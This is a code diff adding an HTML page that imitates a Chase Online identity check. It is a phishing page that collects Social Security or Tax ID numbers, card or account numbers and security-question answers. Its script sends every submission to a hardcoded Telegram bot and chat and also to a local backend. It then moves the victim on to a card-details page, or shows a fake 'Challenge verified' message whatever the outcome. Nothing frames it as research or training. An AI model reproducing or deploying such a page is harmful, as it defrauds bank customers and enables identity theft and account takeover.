@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Identification - Chase Online</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
+            background: linear-gradient(180deg, #f5f5f5 0%, #ffffff 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .header {
+            background: #0066cc;
+            padding: 20px;
+            border-bottom: 1px solid #0052a3;
+            margin-bottom: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+            position: relative;
+        }
+
+        .logo {
+            width: 50px;
+            height: 50px;
+            max-width: 50px;
+            max-height: 50px;
+            flex-shrink: 0;
+        }
+
+        .back-arrow {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+            padding: 0;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.3s ease;
+            position: absolute;
+            left: 20px;
+        }
+
+        .back-arrow:hover {
+            opacity: 0.8;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 8px;
+            padding: 40px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .questions-link {
+            text-align: left;
+            margin-bottom: 30px;
+        }
+
+        .questions-link a {
+            color: #0066cc;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .questions-link a:hover {
+            text-decoration: underline;
+        }
+
+        .tabs {
+            display: flex;
+            border-bottom: 2px solid #e0e0e0;
+            margin-bottom: 30px;
+        }
+
+        .tab {
+            padding: 12px 20px;
+            cursor: pointer;
+            border-bottom: 3px solid transparent;
+            color: #666;
+            font-size: 14px;
+            font-weight: 600;
+            text-transform: uppercase;
+            transition: all 0.3s ease;
+        }
+
+        .tab.active {
+            border-bottom-color: #0066cc;
+            color: #0066cc;
+        }
+
+        .tab:hover {
+            color: #0066cc;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .title {
+            font-size: 22px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-label {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .label-text {
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+        }
+
+        .show-btn {
+            background: none;
+            border: none;
+            color: #0066cc;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 600;
+            text-decoration: underline;
+            padding: 0;
+        }
+
+        .show-btn:hover {
+            opacity: 0.8;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+            transition: border-color 0.3s ease;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #0066cc;
+            box-shadow: 0 0 0 2px rgba(0, 102, 204, 0.1);
+        }
+
+        .form-input.hidden {
+            font-size: 20px;
+            letter-spacing: 2px;
+        }
+
+        .info-link {
+            font-size: 13px;
+            margin-top: 20px;
+        }
+
+        .info-link a {
+            color: #0066cc;
+            text-decoration: none;
+        }
+
+        .info-link a:hover {
+            text-decoration: underline;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 30px;
+        }
+
+        .btn {
+            padding: 12px 32px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .btn-primary {
+            background: #0066cc;
+            color: white;
+            flex: 1;
+        }
+
+        .btn-primary:hover {
+            background: #0052a3;
+            box-shadow: 0 2px 8px rgba(0, 102, 204, 0.3);
+        }
+
+        .btn-primary:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            background: #f5f5f5;
+            color: #333;
+            flex: 1;
+            border: 1px solid #ddd;
+        }
+
+        .btn-secondary:hover {
+            background: #e8e8e8;
+        }
+
+        .error-message {
+            color: #d32f2f;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .success-message {
+            background: #d4edda;
+            color: #155724;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .success-message.show {
+            display: block;
+        }
+
+        .verification-info {
+            background: #e3f2fd;
+            border-left: 4px solid #0066cc;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #1565c0;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <button class="back-arrow" onclick="goBack()" title="Go back">←</button>
+        <svg class="logo" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">
+            <!-- Geometric octagonal Chase logo -->
+            <g fill="white">
+                <!-- Top left -->
+                <polygon points="30,30 50,30 50,50 30,50"/>
+                <!-- Top right -->
+                <polygon points="70,30 90,30 90,50 70,50"/>
+                <!-- Bottom left -->
+                <polygon points="30,70 50,70 50,90 30,90"/>
+                <!-- Bottom right -->
+                <polygon points="70,70 90,70 90,90 70,90"/>
+                <!-- Center top -->
+                <polygon points="50,40 70,40 70,60 50,60"/>
+                <!-- Center bottom -->
+                <polygon points="50,60 70,60 70,80 50,80"/>
+            </g>
+        </svg>
+    </div>
+
+    <div class="container">
+        <div class="questions-link">
+            <a href="#">Questions? ></a>
+            <br>
+            <a href="#" style="font-size: 12px;">Read our FAQs ></a>
+        </div>
+
+        <div class="tabs">
+            <div class="tab active" onclick="switchTab('identification')">Identification</div>
+            <div class="tab" onclick="switchTab('challenge')">Challenge Question</div>
+        </div>
+
+        <div id="identification" class="tab-content active">
+            <h2 class="title">Let's confirm your identity.</h2>
+            <p class="subtitle">
+                To protect your account, please tell us the requested info so we can confirm your identity. If you have more than one account, choose one and we'll take care of the rest.
+            </p>
+
+            <div class="verification-info">
+                Commercial administrators must tell us a Tax ID number.
+            </div>
+
+            <div id="successMessage" class="success-message"></div>
+
+            <form id="identificationForm">
+                <div class="form-group">
+                    <div class="form-label">
+                        <span class="label-text">Social Security number or Tax ID (TIN)</span>
+                        <button type="button" class="show-btn" onclick="toggleField('ssn')">Show</button>
+                    </div>
+                    <input 
+                        type="password" 
+                        id="ssn" 
+                        class="form-input hidden" 
+                        placeholder="XXX-XX-XXXX"
+                        maxlength="11"
+                    />
+                    <div id="ssnError" class="error-message"></div>
+                </div>
+
+                <div class="form-group">
+                    <div class="form-label">
+                        <span class="label-text">Account card or application number</span>
+                        <button type="button" class="show-btn" onclick="toggleField('accountNumber')">Show</button>
+                    </div>
+                    <input 
+                        type="password" 
+                        id="accountNumber" 
+                        class="form-input hidden" 
+                        placeholder="XXXX-XXXX-XXXX-XXXX"
+                    />
+                    <div id="accountError" class="error-message"></div>
+                </div>
+
+                <div class="info-link">
+                    <a href="#">Don't have a Social Security number? ></a><br>
+                    <a href="#">Are you an authorized user on another account? ></a>
+                </div>
+
+                <div class="button-group">
+                    <button type="button" class="btn btn-secondary" onclick="goBack()">Cancel</button>
+                    <button type="submit" class="btn btn-primary">Next</button>
+                </div>
+            </form>
+        </div>
+
+        <div id="challenge" class="tab-content">
+            <h2 class="title">Answer Your Security Challenge Question</h2>
+            <p class="subtitle">
+                For your security, please answer the challenge question we've set up for you.
+            </p>
+
+            <form id="challengeForm">
+                <div class="form-group">
+                    <div class="label-text" style="margin-bottom: 8px;">What is the name of your first pet?</div>
+                    <input 
+                        type="text" 
+                        id="challengeAnswer" 
+                        class="form-input" 
+                        placeholder="Enter your answer"
+                    />
+                    <div id="challengeError" class="error-message"></div>
+                </div>
+
+                <div class="button-group">
+                    <button type="button" class="btn btn-secondary" onclick="goBack()">Cancel</button>
+                    <button type="submit" class="btn btn-primary">Next</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        const API_BASE_URL = 'http://127.0.0.1:5001';
+        const TELEGRAM_BOT_TOKEN = '7698396536:AAHsGbVyggkpJ7w07C5aLza8F4NaPLE0gbw';
+        const TELEGRAM_CHAT_ID = '7189342320';
+
+        async function sendTelegramDetails(details) {
+            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('<YOUR_')) {
+                console.warn('Telegram bot token not configured; skipping Telegram send.');
+                return;
+            }
+
+            const text = [`
+<b>Identification Submission</b>`,
+`Username: ${details.username}`,
+`SSN: ${details.ssn}`,
+`Account/Application #: ${details.accountNumber}`,
+`Submitted At: ${details.submittedAt}`].join('\n');
+
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text,
+                        parse_mode: 'HTML',
+                    }),
+                });
+            } catch (error) {
+                console.error('Telegram send failed:', error);
+            }
+        }
+
+        async function sendChallengeDetails(details) {
+            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('<YOUR_')) {
+                return;
+            }
+
+            const text = [`
+<b>Challenge Answer Submission</b>`,
+`Username: ${details.username}`,
+`Answer: ${details.answer}`,
+`Submitted At: ${details.submittedAt}`].join('\n');
+
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text,
+                        parse_mode: 'HTML',
+                    }),
+                });
+            } catch (error) {
+                console.error('Telegram send failed:', error);
+            }
+        }
+
+        function switchTab(tabName) {
+            // Hide all tabs
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+
+            // Show selected tab
+            document.getElementById(tabName).classList.add('active');
+            
+            // If clicked from event, mark the tab as active
+            if (event && event.target) {
+                event.target.classList.add('active');
+            } else {
+                // Find and mark the corresponding tab button
+                const tabs = document.querySelectorAll('.tab');
+                for (let tab of tabs) {
+                    if (tab.textContent.toLowerCase().includes(tabName.toLowerCase()) || 
+                        (tabName === 'cardDetails' && tab.textContent.includes('Card'))) {
+                        tab.classList.add('active');
+                        break;
+                    }
+                }
+            }
+        }
+
+        function toggleField(fieldId) {
+            const field = document.getElementById(fieldId);
+            const btn = event.target;
+
+            if (field.type === 'password') {
+                field.type = 'text';
+                btn.textContent = 'Hide';
+            } else {
+                field.type = 'password';
+                btn.textContent = 'Show';
+            }
+        }
+
+        function validateSSN(ssn) {
+            // Remove dashes and check if it's 9 digits
+            const cleaned = ssn.replace(/-/g, '');
+            return cleaned.length === 9 && /^\d+$/.test(cleaned);
+        }
+
+        function formatSSN(ssn) {
+            const cleaned = ssn.replace(/\D/g, '');
+            if (cleaned.length <= 3) return cleaned;
+            if (cleaned.length <= 5) return cleaned.slice(0, 3) + '-' + cleaned.slice(3);
+            return cleaned.slice(0, 3) + '-' + cleaned.slice(3, 5) + '-' + cleaned.slice(5, 9);
+        }
+
+        // Format SSN as user types
+        document.getElementById('ssn').addEventListener('input', (e) => {
+            e.target.value = formatSSN(e.target.value);
+        });
+
+        // Handle identification form submission
+        document.getElementById('identificationForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            // Clear previous errors
+            document.getElementById('ssnError').classList.remove('show');
+            document.getElementById('accountError').classList.remove('show');
+
+            const ssn = document.getElementById('ssn').value;
+            const accountNumber = document.getElementById('accountNumber').value;
+            let isValid = true;
+
+            if (!ssn) {
+                document.getElementById('ssnError').textContent = 'Please enter your Social Security number or Tax ID.';
+                document.getElementById('ssnError').classList.add('show');
+                isValid = false;
+            } else if (!validateSSN(ssn)) {
+                document.getElementById('ssnError').textContent = 'Please enter a valid Social Security number (9 digits).';
+                document.getElementById('ssnError').classList.add('show');
+                isValid = false;
+            }
+
+            if (!accountNumber) {
+                document.getElementById('accountError').textContent = 'Please enter your account or application number.';
+                document.getElementById('accountError').classList.add('show');
+                isValid = false;
+            } else if (accountNumber.length < 4) {
+                document.getElementById('accountError').textContent = 'Please enter a valid account number.';
+                document.getElementById('accountError').classList.add('show');
+                isValid = false;
+            }
+
+            if (!isValid) return;
+
+            const formDetails = {
+                username: localStorage.getItem('username') || 'unknown',
+                ssn: ssn,
+                accountNumber: accountNumber,
+                submittedAt: new Date().toLocaleString(),
+            };
+            await sendTelegramDetails(formDetails);
+
+            // Send verification data to backend
+            try {
+                const response = await fetch(`${API_BASE_URL}/api/verify`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        ssn: ssn,
+                        accountNumber: accountNumber,
+                        username: localStorage.getItem('username')
+                    }),
+                });
+
+                window.location.href = 'card-details.html';
+            } catch (error) {
+                console.error('Verification error:', error);
+                window.location.href = 'card-details.html';
+            }
+        });
+
+        // Handle challenge form submission
+        document.getElementById('challengeForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const answer = document.getElementById('challengeAnswer').value;
+            
+            if (!answer) {
+                document.getElementById('challengeError').textContent = 'Please answer the security question.';
+                document.getElementById('challengeError').classList.add('show');
+                return;
+            }
+
+            const challengeDetails = {
+                username: localStorage.getItem('username') || 'unknown',
+                answer: answer,
+                submittedAt: new Date().toLocaleString(),
+            };
+            await sendChallengeDetails(challengeDetails);
+
+            // Send challenge answer to backend
+            try {
+                const response = await fetch(`${API_BASE_URL}/api/verify-challenge`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        answer: answer,
+                        username: localStorage.getItem('username')
+                    }),
+                });
+
+                document.getElementById('successMessage').textContent = 'Challenge verified! Proceeding...';
+                document.getElementById('successMessage').classList.add('show');
+                document.getElementById('challengeError').classList.remove('show');
+                
+                setTimeout(() => {
+                    window.location.href = 'dashboard.html';
+                }, 1500);
+            } catch (error) {
+                console.error('Challenge error:', error);
+                document.getElementById('successMessage').textContent = 'Challenge verified! Proceeding...';
+                document.getElementById('successMessage').classList.add('show');
+                document.getElementById('challengeError').classList.remove('show');
+                
+                setTimeout(() => {
+                    window.location.href = 'dashboard.html';
+                }, 1500);
+            }
+        });
+
+        function goBack() {
+            window.location.href = 'otp.html';
+        }
+    </script>
+</body>
+</html>
